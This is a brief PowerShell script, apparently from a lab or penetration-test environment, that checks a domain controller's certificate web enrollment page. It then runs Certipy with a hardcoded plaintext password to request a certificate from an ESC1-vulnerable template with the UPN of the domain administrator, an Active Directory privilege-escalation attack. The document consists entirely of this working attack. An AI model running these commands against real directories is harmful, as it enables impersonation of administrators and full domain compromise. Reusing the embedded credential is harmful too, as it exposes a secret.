Write-Output "=== web enrollment from ws01 ==="
try {
    $r = Invoke-WebRequest "http://dc01.cadre.local/certsrv/" -UseBasicParsing -TimeoutSec 10 -UseDefaultCredentials
    Write-Output ("CERTSRV " + $r.StatusCode)
} catch {
    Write-Output ("CERTSRV_FAIL " + $_.Exception.Message)
}
Write-Output "=== certipy req -debug RPC ==="
python "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe" req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -dynamic-endpoint -template CADRE-ESC1 -upn administrator@cadre.local -out esc1-debug -debug 2>&1 | Select-Object -Last 30
